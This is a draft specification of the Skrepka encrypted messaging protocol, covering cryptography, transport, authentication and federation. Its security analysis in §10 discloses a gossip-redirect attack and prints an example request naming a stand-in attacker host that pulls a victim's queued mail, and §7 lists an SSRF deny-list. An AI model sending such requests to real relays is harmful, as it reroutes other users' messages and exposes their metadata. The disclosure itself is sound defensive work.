# Skrepka Protocol Specification

**Version:** 0.1 (Draft)

---

## 1. Overview

Skrepka is a decentralized, end-to-end encrypted messaging protocol. It has no user accounts, no home servers, and no central authority.

### Design Goals

- **No accounts.** A user's identity is their cryptographic keypair. No registration, no passwords, no servers storing credentials.
- **No home server.** Users connect to any server in the mesh and can switch freely. Servers are disposable relays.
- **End-to-end encryption.** Servers see only routing metadata. Message content — including the sender's identity — is opaque to the server.
- **Open federation.** Any server can join the mesh. Operators may optionally blocklist specific peers.
- **Ephemeral.** Server mailboxes expire after 30 days. No permanent server-side history.
- **Simplicity.** Plain HTTP transport, no session negotiation, no ratchets.

### Non-Goals

- Forward secrecy (per-message ephemeral keys provide partial protection, but no ratchet)
- Recipient metadata privacy (servers see the recipient and timestamps; the sender is not visible to servers)
- Durable message storage (servers queue temporarily, not permanently)
- Peer-to-peer delivery (at least one server must be reachable)

---

## 2. Identity

### Key Generation

On first launch, a client generates an **Ed25519 keypair** (the identity key). The corresponding **X25519 public key** for key agreement is derived from the Ed25519 key using the birational map between the two curves (RFC 7748 / RFC 8032). This means a single keypair serves both signing and encryption — only the Ed25519 key needs to be stored and shared.

The user's **public key is their identity**. There are no usernames, no global namespace, and no registration step.

Each device generates its own independent keypair and is treated as a separate identity.

### Key Format

Public keys, signatures, and encrypted blobs are encoded as **lowercase hexadecimal** on the wire and in storage. An Ed25519 public key is 32 bytes (64 hex chars); a signature is 64 bytes (128 hex chars).

### Sharing an Identity

Identities are shared out-of-band as plain text or QR codes. The client displays public keys in two forms:

- **Hex** — 64 lowercase hex characters (the canonical wire form).
- **@p (phonetic)** — the public key rendered as Urbit-style syllables, hyphen-joined with no leading prefix (e.g. `ridler-binzod-marbud-...`). Easier for humans to read and verify by voice. The client accepts either form when adding a contact.

Servers are addressed separately. A client stores a single server URL (e.g. `https://relay.example.com`) in local settings; this is purely a transport choice and has nothing to do with identity. Two users on different servers can still talk via federation.

### Trust Model

**Trust-on-First-Use (TOFU).** The first time a client encounters a public key, it is accepted and cached. Optional out-of-band verification (e.g., comparing fingerprints or @p syllables in person) is supported but not required by the protocol.

### Contacts

There is no global directory. Users assign local nicknames to public keys on their own device.

---

## 3. Cryptography

### Algorithms

| Purpose          | Algorithm             |
|------------------|-----------------------|
| Signing          | Ed25519               |
| Key agreement    | X25519                |
| Key derivation   | HKDF-SHA256           |
| Symmetric cipher | XChaCha20-Poly1305    |
| Compression      | zstd (pre-encryption) |

### Per-Message Encryption

Each message is independently encrypted. There are no sessions, no ratchet, and no state between sender and recipient.

The wire-visible "envelope" carries only the recipient and the opaque blob. The sender's public key and signature are placed **inside** the AEAD ciphertext, so the server learns nothing about who sent a given message. The signature is bound to the recipient's public key, preventing a captured ciphertext from being replayed against a different recipient.

**Encryption flow:**

1. Generate an ephemeral X25519 keypair:
   ```
   ephemeral_private, ephemeral_public = x25519_generate()
   ```
2. Derive the recipient's X25519 public key from their Ed25519 public key, and compute the raw shared secret:
   ```
   recipient_x25519_public = ed25519_pk_to_curve25519(recipient_ed25519_public)
   raw_secret = x25519(ephemeral_private, recipient_x25519_public)
   ```
3. Derive the symmetric encryption key using HKDF-SHA256:
   ```
   key = hkdf_sha256(
     ikm   = raw_secret,
     salt  = ephemeral_public || recipient_x25519_public,
     info  = "skrepka-v1",
     len   = 32
   )
   ```
4. zstd-compress the plaintext payload (see §4):
   ```
   compressed = zstd(plaintext_bytes)   // standard zstd frame (embeds content size)
   ```
5. Sign the recipient pubkey concatenated with the compressed plaintext. Binding the signature to the recipient prevents the same blob from being replayed against another recipient:
   ```
   signature = ed25519_sign(sender_ed25519_private,
                            recipient_ed25519_public || compressed)
   ```
6. Build the inner buffer that will be encrypted:
   ```
   inner = sender_ed25519_public || signature || compressed
   ```
7. Generate a random 24-byte nonce and AEAD-encrypt the inner buffer:
   ```
   nonce      = random_bytes(24)
   ciphertext = xchacha20_poly1305_encrypt(key, nonce, inner)   // no associated data
   ```
8. Emit the on-wire blob:
   ```
   blob = ephemeral_public || nonce || ciphertext
   ```

**Decryption flow:**

1. Split the blob: 32-byte `ephemeral_public`, 24-byte `nonce`, remainder is `ciphertext`.
2. Derive the recipient's X25519 private key from the recipient's Ed25519 private key, compute the raw shared secret with `ephemeral_public`, and HKDF-derive the same `key`.
3. AEAD-decrypt the ciphertext to recover the inner buffer.
4. Split: 32-byte `sender_ed25519_public`, 64-byte `signature`, remainder is `compressed`.
5. Verify the signature over `recipient_ed25519_public || compressed` using `sender_ed25519_public`. Reject the message on failure.
6. zstd-decompress to recover the plaintext payload.

### Encrypted Blob Format

On the wire (cleartext, server-visible):

```
ephemeral_x25519_pubkey   (32 bytes)
nonce                     (24 bytes)
ciphertext                (variable, includes 16-byte AEAD tag)
```

After AEAD decryption, the inner buffer is:

```
sender_ed25519_pubkey     (32 bytes)
signature                 (64 bytes)
compressed_plaintext      (variable, zstd)
```

The sender's pubkey and signature are inside the AEAD ciphertext: the server never sees them, and only the intended recipient can recover the sender's identity. The minimum blob size is `32 + 24 + 32 + 64 + 16 = 168` bytes.

### Cryptographic Versioning

There is currently **no version field** on the wire or in the plaintext payload, and the HKDF `info` string is the fixed constant `"skrepka-v1"`. The unknown-`type` rule (§4) gives forward compatibility for *payload* types, but the wire format, AEAD, KDF, and curve choices have no negotiated version, so there is no in-band path to migrate them without a flag day. A future revision should introduce an explicit protocol version (e.g. a leading version byte on the blob, or a `v` field) to allow cryptographic agility.

---

## 4. Message Format

### Envelope

The envelope is what servers see. It carries only the recipient and the opaque encrypted blob — there is **no `from` field**. The sender's identity is recoverable only by the recipient, from inside the decrypted blob.

```json
{
  "to": "<hex(recipient_ed25519_pubkey)>",
  "encryptedBlob": "<hex(encrypted_blob)>"
}
```

| Field           | Type   | Description                                      |
|-----------------|--------|--------------------------------------------------|
| `to`            | string | Recipient's Ed25519 public key (64 lowercase hex)|
| `encryptedBlob` | string | Hex-encoded blob from §3                         |

Servers route based on `to`. They cannot inspect `encryptedBlob` and they do not know the sender.

### Plaintext Payload

After decryption (and zstd decompression), the plaintext is a UTF-8 JSON object with a `type` field:

```json
{
  "type": "<message_type>",
  "ts":   1679000000000,
  ...
}
```

- `type` and `ts` are present on every payload. `ts` is the sender's wall-clock at send time, in **milliseconds** since the Unix epoch.
- `id` is a client-generated unique ID (e.g. UUID v4) carried by `text` messages only. Clients deduplicate incoming `text` messages by `id`. `delivery.ack` and `profile` payloads do not carry an `id`.
- Clients MUST silently ignore message types they do not recognize. This allows newer clients to introduce new types without breaking older ones.

### Message Types

The current implementation defines three plaintext message types:

| Type            | Description                              | Additional Fields                              |
|-----------------|------------------------------------------|------------------------------------------------|
| `text`          | A text message                           | `body` (string)                                 |
| `delivery.ack`  | Sender-side delivery confirmation        | `ack_ids` (array of message IDs)                |
| `profile`       | Share display name, bio, and/or photo    | `display_name`, `bio` (strings), `photo` (base64-encoded image, optional) |

Future message types (media attachments, read receipts, group messages) are not part of this revision.

### Profiles

Users share a display name, bio, and photo with contacts by sending a `profile` message. This is a regular encrypted message — servers never see profile data.

```json
{
  "type": "profile",
  "ts": 1679000000000,
  "display_name": "Alice",
  "bio": "writing things",
  "photo": "<base64(jpeg_data)>"
}
```

Clients SHOULD send a `profile` message to a contact on first interaction and whenever the user updates their name, bio, or photo. The recipient's client caches the profile locally. `photo` is optional and MAY be omitted.

Because `profile` messages carry no `id`, they are not deduplicated, and a captured `profile` blob can be replayed to the same recipient (see §10, *Same-recipient replay*). To prevent an old profile from clobbering a newer one, clients SHOULD ignore an incoming `profile` whose `ts` is older than the `ts` of the last profile already stored for that contact. **The reference client enforces this**: it records the `ts` of the most recent profile accepted per contact and drops any incoming `profile` that predates it, so a replayed stale profile cannot roll a contact's cached name, bio, or photo back. A client that skipped the check would be vulnerable to exactly that rollback.

### Delivery Acks

When a recipient successfully decrypts an incoming `text` message, the recipient's client SHOULD send a `delivery.ack` message back to the sender:

```json
{
  "type": "delivery.ack",
  "ack_ids": ["msg_123", "msg_124"],
  "ts": 1679000000000
}
```

This is the only delivery-confirmation channel in the protocol: the server itself does **not** report delivery status to senders. See §9 for the full flow.

### Blocking

Blocking is client-side only. A blocked sender's messages are still received and decrypted but are not displayed to the user. The protocol does not provide a mechanism to tell a server to reject messages from a specific pubkey.

---

## 5. Transport

All communication uses **plain HTTP**, served over TLS in production.

| Direction          | Mechanism            |
|--------------------|----------------------|
| Client → Server    | HTTP POST            |
| Server → Client    | Long polling (POST)  |
| Server → Server    | HTTP POST            |

**Why HTTP + long polling:**
- No special protocols. Works through proxies, load balancers, and CDNs.
- Long polling provides near-real-time delivery over plain request/response cycles.
- No persistent connections, no WebSocket upgrade, no gRPC toolchain, no raw TCP.

### Server Discovery

Skrepka has no central directory. Clients are configured with a single server URL (stored locally) and stay on it until the user changes it. The repository ships a `servers.json` file listing public relays as a convenience:

```json
[
  "https://1.skrepka.lol",
  "https://2.skrepka.lol",
  "https://3.skrepka.lol"
]
```

This file is a static suggestion, not a federation directory. Federation between servers is configured server-side, independently of any client-facing list.

### Content Type

All request and response bodies use `application/json`.

### Federation Transport

Servers contact peers over `https://<peer-host>`. Federation traffic carries no bearer tokens — federation endpoints are open to any caller, with abuse-related defenses (SSRF egress filtering, presence-gated forwarding, per-peer linear backoff) handled internally. Those defenses bound abuse; they do **not** authenticate the peer, and an unauthenticated caller can both redirect a victim's queued mail (via `/federation/gossip`) and inject blobs into an online recipient's mailbox (via `/federation/forward`). Both are accepted limitations of v0.1 — see §7 for the endpoints and §10 for the security analysis.

### Message Size Limit

The on-wire `encryptedBlob` (hex) is capped at **40 MiB** (about 20 MiB of binary payload). A blob over the cap is rejected at validation as a malformed message (`400`), not with `413`.

Two limits apply to a `/messages` request, independently of the per-blob cap:

- **Batch count** — at most 100 messages per request (`413 batch_too_large`).
- **Total request body** — the runtime enforces a single HTTP body-size cap (`--http-max-body-bytes`, returning `413` with no JSON error code). Operators **must** set this above `maxBlobLen` plus the JSON envelope — the reference deployment uses `42M` — otherwise the runtime's default 16 MiB cap would reject a maximum-size blob before the per-blob `400` check is reached. Because this caps the whole body, a batch cannot smuggle 100 × 40 MiB: the total payload across all messages in one request is bounded by this cap.

---

## 6. Client ↔ Server Protocol

### Authentication (Challenge-Response)

When a client connects, it proves ownership of its keypair:

1. Client sends its public key:
   ```
   POST /auth/challenge
   { "pubkey": "<hex(ed25519_pubkey)>" }
   ```

2. Server responds with a random challenge string (valid for 60 s):
   ```json
   { "challenge": "<random_hex>", "expiresAt": 1679003660000 }
   ```

3. Client signs the **UTF-8 bytes of `"skrepka-auth-v1:" + server_host + ":" + challenge`** with its Ed25519 private key and submits. `server_host` is the bare lowercased hostname of the server the client dialed (no scheme, no port, no trailing dot). The `skrepka-auth-v1:` prefix is a domain-separation tag distinguishing auth signatures from message signatures (which sign `recipientPub ++ compressed`, §4):
   ```
   POST /auth/verify
   {
     "pubkey":        "<hex(ed25519_pubkey)>",
     "challenge":     "<random_hex>",
     "signature":     "<hex(ed25519_sign(private_key, utf8(\"skrepka-auth-v1:\" + server_host + \":\" + challenge)))>",
     "revokeOthers":  false
   }
   ```
   The server verifies against its own configured hostname (`serverHost`, port stripped). Binding the signature to the target host prevents a malicious or relay server from forwarding a challenge it obtained from a *different* server and replaying the client's signature there to impersonate the client (§10, *Unauthenticated session relay*).
   Setting `revokeOthers: true` invalidates every other live session for this pubkey (useful for "log out other devices").

4. Server verifies the signature. On success, returns a session token valid for **1 hour**:
   ```json
   { "token": "<session_token>", "expiresAt": 1679003600000 }
   ```

The session token is included in subsequent authenticated requests as a bearer token:
```
Authorization: Bearer <session_token>
```

When the server trusts proxy headers (`trustForwardedFor`, on by default), sessions are bound to the client's source IP — the last `X-Forwarded-For` hop. A later request from a different IP is rejected as `unauthorized`. If proxy-header trust is disabled, or no `X-Forwarded-For` header is present, the session is not IP-bound and this check is skipped.

> **IP binding and mobile clients.** IP binding means a session does not survive a change of source address. In the reference deployment (Caddy in front, `trustForwardedFor` on) a phone that moves between Wi-Fi and cellular — or is NAT-rebound by its carrier — comes back on a new IP, so its next `/poll` or `/messages` gets `401 unauthorized` even though the token has not expired. This is expected: a client MUST treat `401` on any authenticated request as "re-run challenge/verify", not as a fatal error, and retry the request with the fresh token. The cost is one extra round trip per network change; the benefit is that a stolen bearer token is not usable from another network. Operators who prefer sessions that roam can run with `--trustForwardedFor=False`, which leaves sessions un-bound (the check is skipped when no trusted IP is available).

When a token expires, the server responds with `401`. The client re-authenticates by repeating the challenge-response flow.

> **Channel binding.** The signed payload includes the target server's hostname under the `skrepka-auth-v1:` domain-separation tag (step 3). Because the client binds to the host it actually dialed and the server verifies against its own `serverHost`, a relay server cannot forward a challenge it obtained from a *different* server and replay the resulting signature to impersonate the client there: the client's signature commits to the relay's hostname, not the victim server's, so verification at the victim fails. This binding is a **breaking change** — client and server must agree on the signed payload. The host comparison is on the bare hostname only (port and scheme excluded), so the same identity authenticates regardless of the port a server listens on.

A successful `/auth/verify` also installs the pubkey in the local presence table and broadcasts an `online` gossip event to known peers (§7).

### Error Responses

Errors return a non-2xx HTTP status with a body of:

```json
{ "error": "<code>" }
```

| HTTP Status | Error Code            | Meaning                              |
|-------------|-----------------------|--------------------------------------|
| 400         | `self_send`           | A message in `/messages` is addressed to the sender |
| 400         | `invalid_message`     | A message in `/messages` has a malformed `to` or oversized/invalid `encryptedBlob` |
| 400         | `invalid_request`     | Malformed federation request: `fromServer` equals this server, fails the SSRF deny-list, or the event count exceeds the cap |
| 401         | `invalid`             | `/auth/verify` failed (bad signature, or an expired/wrong-IP challenge) |
| 401         | `unauthorized`        | `/poll` or `/messages` with a missing, invalid, or expired token, or a request from a different IP |
| 403         | `federation_disabled` | A `/federation/*` endpoint was called while federation is disabled |
| 404         | `no_presence`         | Federated forward arrived for a recipient with no live local session |
| 413         | `batch_too_large`     | A `/messages` batch exceeds the 100-message cap |
| 429         | (HTTP only)           | Per-route rate limit exceeded        |
| 503         | `capacity`            | Server-side resource cap reached     |

### `POST /poll` — Long poll for new events

The client makes a blocking POST. The server holds the connection open until new events are available or the long-poll timeout (25 s) elapses.

**Headers:** `Authorization: Bearer <token>`

**Request:**
```json
{ "cursor": 0 }
```

`cursor` is the maximum `receivedAt` value the client has already seen (`0` on first poll).

**Response:**
```json
{
  "events": [
    { "encryptedBlob": "<hex>" }
  ],
  "cursor": 1679000000123
}
```

- `cursor` is a server-side **strictly-monotonic sequence**, seeded from the wall-clock millisecond at assignment but bumped to `previous + 1` whenever messages arrive within the same millisecond. Two messages therefore never share a `receivedAt`, so advancing the cursor past one message can never silently drop another. Treat it as an opaque checkpoint, not a clock.
- Advancing past a message acts as an **implicit ack**: when the next poll arrives with a `cursor` greater than or equal to a stored message's `receivedAt`, the server drops the stored message **and any pending federation forwards for it**.
- If events are available immediately, the server responds right away. Otherwise it parks the connection on a row-level wait against the mailbox and returns when a new matching message lands or after 25 s, whichever comes first.
- An empty page (`events: []`) is returned on timeout, with the cursor echoed back.
- A single response is capped at 50 events; the client should poll again immediately after receiving any response.

### `POST /messages` — Send messages

**Headers:** `Authorization: Bearer <token>`

Sends are **batched** and all-or-nothing. Up to 100 messages per request:

**Request:**
```json
{
  "messages": [
    { "to": "<hex(recipient_pubkey)>", "encryptedBlob": "<hex>" }
  ]
}
```

**Response:**
- `200 {}` on success — every message in the batch has been enqueued for delivery (locally, via federation, or both).
- `400 { "error": "self_send" }` if any message targets the authenticated pubkey.
- `401 / 429 / 503` per the table above.

The server learns the sender from the bearer token, uses it only to reject self-sends and to enforce per-session rate limits, and does **not** persist the sender alongside the stored message.

Whether a recipient is currently reachable, offline, or known via federation is internal to the server. The sender's UI learns "they got it" only via a returning `delivery.ack` (§4) from the recipient — there is no server-issued delivery status.

There is **no `/messages/ack` endpoint**: poll cursor advance is the only acknowledgement signal a recipient sends to the server.

### Endpoints Not Present

The following endpoints exist in earlier drafts of this spec but are **not** implemented:

- `POST /messages/ack` — replaced by implicit ack on poll cursor advance.
- `GET /lookup/:pubkey` — presence information is internal; clients have no way to query it.
- `POST /federation/ack` — federation cleanup is driven by the receiving peer's poll-ack, not a back-channel.

---

## 7. Server ↔ Server Protocol

### Mesh Formation

Federation is open. A server joins the mesh by being configured (at build/start time) with its own public hostname; peers learn of each other through gossip and through messages flowing across them. There is no central registry.

Operators may apply an inbound blocklist; outbound federation is filtered through a built-in **SSRF deny-list** that rejects:

- `localhost`, and the `.localhost`, `.local`, `.internal`, `.arpa`, `.onion` suffixes
- Private and special-use IPv4 ranges: `0/8`, `10/8`, `100.64/10` (CGNAT), `127.0.0.0/8`, `169.254/16` (link-local), `172.16/12`, `192.0.2/24` and `203.0.113/24` (TEST-NET), `192.168/16`, `198.18/15` (benchmarking), and everything from `224/4` upward (multicast + reserved)
- Obfuscated IPv4 literals: bare integer/"dword" form (e.g. `2130706433`), `0x`-prefixed hex, and dotted forms with a leading-zero (octal) octet (e.g. `0177.0.0.1`)
- IPv6 literals — any host containing more than one `:` (covering `::`, `::1`, link-local, ULA, and global addresses) and any bracketed `[…]` form
- The empty string, and any host beginning with `.` or `:`
- Anything containing characters outside `[a-z0-9-.:]`

This applies both to outbound `fetch` calls and to the `fromServer` field on inbound federation requests.

### Gossip (Presence Announcements)

When a user authenticates or polls, the server marks them locally online and broadcasts an `online` event. When a session expires or the polled presence row times out, an `offline` event is sent.

**Event format (one entry per pubkey):**

```json
{ "eventType": "online",  "pubkey": "<hex>" }
{ "eventType": "offline", "pubkey": "<hex>" }
```

Events carry no timestamp, no server name, and no TTL on the wire. Each receiver anchors a local TTL (90 minutes by default) at the moment of receipt; the originating server is taken from the transport-level `fromServer` field, not the event body.

Gossip is **single-hop**: when a server receives a gossip batch, it updates its presence table and (for newly-online keys) forwards any locally-queued messages to the originator, but it does **not** propagate the events to its own peers. There is no hop counter.

A server may hold multiple presence rows for the same pubkey — one per peer that has reported the pubkey online — to handle multi-device or in-flight handoff between servers.

### `POST /federation/gossip` — Ingest peer presence events

**Request:**
```json
{
  "events": [
    { "eventType": "online",  "pubkey": "<hex>" },
    { "eventType": "offline", "pubkey": "<hex>" }
  ],
  "fromServer": "peer.example.com"
}
```

- Up to 100 events per request.
- Rejected with `400 invalid_request` if `fromServer` equals this server's identity, fails the SSRF deny-list, or the event count exceeds the cap.
- `online` events for keys not previously seen at `fromServer` trigger an immediate forward sweep: any locally-queued messages addressed to those keys are scheduled for `/federation/forward`.

> **Unauthenticated — and this endpoint steers delivery.** `/federation/gossip` accepts any caller, and the `fromServer` field is self-asserted. Because an `online` event causes the receiving server to forward that pubkey's queued mail to `fromServer`, anyone who can reach a relay can *redirect* a victim's inbound ciphertext to a host of their choosing by announcing `{ "eventType": "online", "pubkey": <victim>, "fromServer": <attacker-host> }`. See §10, *Open federation — gossip redirect*.

### `POST /federation/forward` — Receive a federated message

**Request:**
```json
{
  "toKey":         "<hex(recipient_pubkey)>",
  "encryptedBlob": "<hex>"
}
```

There is no `from`, no origin-server hint, and no sender timestamp — the receiving server simply records the blob for the recipient.

The receiver **requires the recipient to be currently locally online** (i.e. have an unexpired local presence row). If not, it returns `404 no_presence` and the origin retries (see below) or holds the message in its own mailbox.

> **Unauthenticated — mailbox injection is possible.** `/federation/forward` accepts any caller: there is no bearer token, no peer signature, and nothing ties the request to a server the receiver actually federates with. Any host that can reach a relay can therefore inject arbitrary blobs into the mailbox of any recipient who is currently locally online. The only bounds are the per-source-IP rate limit on the route (`forwardLimit`), the SSRF deny-list (which constrains where a relay will *send*, not who may call it), and the `no_presence` gate (which limits injection to online recipients). Injected junk is undecryptable, so a client drops it silently on ingest — but it still occupies the recipient's poll stream and the relay's mailbox until the cursor advances past it. This is an accepted limitation of v0.1; see §10, *Open federation — forward injection*. Peer authentication is the intended fix.

### Forward Retries

Forwards that fail (network error or `no_presence`) remain queued at the origin and are retried by a background loop:

- Linear per-peer backoff: `retryBackoffBase × failures`, capped at `retryBackoffMax` (defaults: base 30 s, cap 8 min).
- Up to `maxForwardRetries` attempts (default 10), then the forward is dropped.
- Per-peer failure counters age out after 24 h, after which the next attempt is treated as fresh.
- A single successful call to a peer clears its failure counter (no half-open state).

When the recipient finally polls a server holding their mail (local or federated), the implicit ack on cursor advance flushes the stored blob and prunes any remaining outbound forwards for it.

### What's NOT Federated

- **Message ack roundtrips.** There is no `/federation/ack`; the origin server learns "the message landed" by observing that its outbound forward succeeded and that no other forwards for the same blob remain pending.
- **Multi-hop gossip.** Each server only sees the presence events of peers it directly federates with.
- **Cross-server presence queries.** Servers do not ask each other "is this key online?" — they wait for a gossip update.

---

## 8. Group Messaging

Group messaging is **not implemented** in the current version. Future revisions may add it as a client-side concept (encrypting one message per group member, with a shared `group_id` in the plaintext payload). Servers would remain entirely unaware of groups.

---

## 9. Offline Delivery

### Queuing

When a server accepts a message via `/messages`, it always writes the blob to its **local mailbox** under a fresh monotonic `receivedAt`. In parallel, if the recipient is known (via gossip) to be online at one or more remote servers, a federation `forward` is queued and attempted asynchronously per server.

If the recipient is not online anywhere, the message simply stays in the local mailbox until either:

- The recipient connects to this server and polls (and acks via cursor advance), or
- An `online` gossip event arrives naming a server where the recipient is now reachable, at which point the queued message is forwarded there.

### TTL

All messages have a **30-day TTL**, enforced server-side: queued messages are deleted 30 days after their `receivedAt`. Servers are temporary relays, not long-term storage. Clients SHOULD also age out local message history.

### Delivery Flow

```
1. Alice sends a message to Bob (offline).
2. Alice's server appends the encrypted blob to its local mailbox.
   Returns: 200 {}

3. ...time passes...

4. Bob connects to Server C; Server C marks Bob locally online and gossips
   { eventType: "online", pubkey: bob } to its peers.
5. Alice's server receives the gossip and queues a /federation/forward to Server C.
6. Server C accepts the forward (Bob is locally online) and appends to Bob's mailbox.
7. Bob's client polls Server C, receives the event, advances its cursor.
8. Cursor advance acts as an implicit ack: Server C deletes the stored blob and
   the corresponding pending forward (so the chain does not double-deliver).
9. Bob's client sends an encrypted `delivery.ack` message back to Alice.
10. When Alice next polls and decrypts that, her UI marks her message delivered.
```

Note: Alice does not need to stay online for steps 4–9. Her server handles federation independently.

### Failure Modes

- If the sender's server goes down before delivering, queued messages are **lost**. This is an accepted tradeoff — servers are disposable.
- If forwarding to a peer fails repeatedly, the forward is dropped after `maxForwardRetries`; the message remains in the origin's mailbox and will only be delivered if the recipient ever polls the origin directly.
- If the recipient never comes back online within 30 days, the message is deleted by the server-side TTL.
- The sender's UI sees no delivery status until a `delivery.ack` is received from the recipient.

### Message Ordering

Message ordering is **best-effort** and guaranteed only within a single server. Each server assigns every message a strictly-monotonic `receivedAt` sequence (unique per message, never colliding even under bursts within one millisecond), which provides total ordering for that server's mailbox; the `cursor` returned by `/poll` reflects this sequence.

Across federated servers, messages may arrive out of order due to network latency, retry delays, or differing reception times. Clients SHOULD use the sender-provided `ts` field (from the decrypted plaintext payload, §4) for display ordering and treat `cursor` as a polling checkpoint only, not a global ordering guarantee.

---

## 10. Security Considerations

### Threat Model

Skrepka protects message **content and sender identity** from servers and network observers. It does not attempt to hide the recipient.

### What Is Protected

| Property                  | Mechanism                                                  |
|---------------------------|------------------------------------------------------------|
| Message confidentiality   | E2E encryption (X25519 + HKDF-SHA256 + XChaCha20-Poly1305) |
| Sender authenticity       | Ed25519 signature on every message                         |
| Sender anonymity vs. server | Sender pubkey is inside the AEAD ciphertext — servers see the recipient but not the sender |
| Replay protection (cross-recipient) | Unique nonce per message; signature binds the recipient pubkey, so a captured blob cannot be replayed against a *different* recipient. This does **not** stop re-delivery of the same blob to the *same* recipient — see *Same-recipient replay* below |
| Partial post-compromise   | Ephemeral X25519 keys per message — once the blob is no longer stored anywhere, even compromising the recipient's long-term key does not recover the message |

### What Is NOT Protected

| Risk                              | Details                                             |
|-----------------------------------|-----------------------------------------------------|
| **No forward secrecy**            | If a message blob is captured *and* the recipient's long-term X25519 key is later compromised, that specific message can be decrypted. No ratchet means no post-compromise recovery. |
| **Recipient metadata exposure**   | Servers see the recipient pubkey and arrival time of every message, plus the rough size of each blob. They do **not** see the sender. |
| **Presence gossip leaks location** | Federated peers learn which server a user is currently connected to. A presence row is anchored for up to 90 min (`onlineGossipTtl`), which outlives the 1 h session, so location metadata — and forwards aimed at the user — can linger for up to ~90 min after the user disconnects. |
| **No durable delivery**           | If the sender's server goes down or all forward retries fail, messages may be lost. |
| **Unauthenticated session relay** (mitigated) | The auth signature is bound to the target server's hostname under a domain-separation tag (§6), so a malicious/relay server can no longer forward another server's challenge and replay the resulting signature to impersonate the client elsewhere — the signature commits to the relay's own hostname. Residual caveat: the binding is to the hostname the client dialed, so it assumes the client reaches each server under its true `serverHost` (DNS/TLS integrity); it does not defend against an attacker who fully controls name resolution and the server's certificate. |
| **Same-recipient replay**         | Nothing stops a captured blob from being re-delivered to its original recipient. The damage is bounded per payload type: `text` is deduplicated by `id`, `delivery.ack` is idempotent, and `profile` — which carries no `id` — is guarded by the per-contact `ts` staleness check of §4, which the reference client enforces, so a replayed stale `profile` is dropped rather than rolling a contact's cached profile back. A client that omits that check is open to profile rollback. |
| **Open federation — gossip redirect** | `/federation/gossip` is unauthenticated, and the harm is *active*, not merely passive observation: an attacker announces the victim online at a host it controls and origin relays forward the victim's queued ciphertext there. See *Open federation* below. |
| **Open federation — forward injection** | `/federation/forward` is unauthenticated, so any host can inject arbitrary blobs into a currently-online recipient's mailbox. See *Open federation* below. |
| **No cryptographic agility**      | The wire format has no version field and a fixed HKDF `info` (§3); the AEAD/KDF/curve cannot be migrated in-band. |
| **TOFU only**                     | A first-time public key is trusted on encounter; users must compare fingerprints out-of-band to detect MITM at first contact. |

### Open Federation (accepted limitation of v0.1)

Every `/federation/*` endpoint accepts **any caller**. There is no bearer token, no peer signature, and no allow-list: a relay cannot tell a genuine peer from an arbitrary host on the internet. Two concrete attacks follow, and it is worth stating them precisely, because "a hostile server can observe gossip" understates both.

**1. Gossip redirect — actively rerouting a victim's mail.** The `fromServer` field on `/federation/gossip` is self-asserted, and an `online` event for a previously-unseen key makes the receiving relay sweep its mailbox and forward that key's queued messages to `fromServer` (§7). So an attacker does not have to wait and watch. It posts:

```json
{ "events": [ { "eventType": "online", "pubkey": "<victim>" } ],
  "fromServer": "attacker.example.com" }
```

to every relay it can reach. Each relay holding mail for the victim now forwards that ciphertext to the attacker's host. The receiver-side "recipient must be locally online" gate does not help — that check runs on the *attacker's* server, which the attacker controls. Message **content** stays protected by E2E encryption, but the attacker harvests ciphertext copies and recipient/timing/size metadata — a real leak for a metadata-privacy-focused messenger.

**2. Forward injection — spam into an online recipient's mailbox.** `/federation/forward` is unauthenticated, so any host can inject arbitrary blobs into the mailbox of any recipient who is currently locally online. Injected junk is undecryptable, so a client drops it silently on ingest — but it occupies the recipient's poll stream and the relay's mailbox until the cursor advances past it. The only bounds are the per-source-IP rate limit (`forwardLimit`), the SSRF deny-list (which constrains where a relay will *send*, not who may call it), and the `no_presence` gate (which limits injection to online recipients).

**Mitigation path.** Both attacks are accepted limitations of v0.1's unauthenticated federation. The intended fix is peer authentication — signed presence gossip and authenticated forward requests — or an explicit peer allow-list gate before `forwardQueuedToServer`. Until then, operators who federate only with trusted peers (or not at all) are unaffected.

### Recommendations for Implementers

- Store private keys in platform-secure storage (Keychain, Keystore, etc.).
- Warn users when a contact's public key changes (TOFU violation).
- Consider pinning server TLS certificates for additional transport security.
- Federate only with peers operated by trusted operators if presence metadata is sensitive.
- Servers SHOULD delete message blobs as soon as the implicit ack (cursor advance) lands.
